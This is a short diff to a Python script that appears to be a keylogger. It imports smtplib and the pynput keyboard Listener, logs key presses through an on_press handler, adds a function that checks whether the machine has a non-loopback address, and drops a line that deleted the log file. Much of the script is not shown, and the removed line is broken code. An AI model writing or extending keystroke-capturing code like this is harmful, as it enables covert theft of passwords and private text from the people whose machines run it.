@@ -1,9 +1,17 @@
 import smtplib
 from pynput.keyboard import Key, Listener
 import logging
+import socket
 import os
 import time
 
+def nc():
+    ipaddress=socket.gethostbyname(socket.gethostname())
+    if ipaddress=="127.0.0.1":
+        return 0
+    else:
+        return 1
+    
 log_dir = ""
 global c
 c=time.time()
@@ -17,7 +25,7 @@ def on_press(key):
             global c
             c=time.time()
             
-            os.remove(log_dir/log.txt)
+            
             
 
 with Listener(on_press=on_press) as listener:
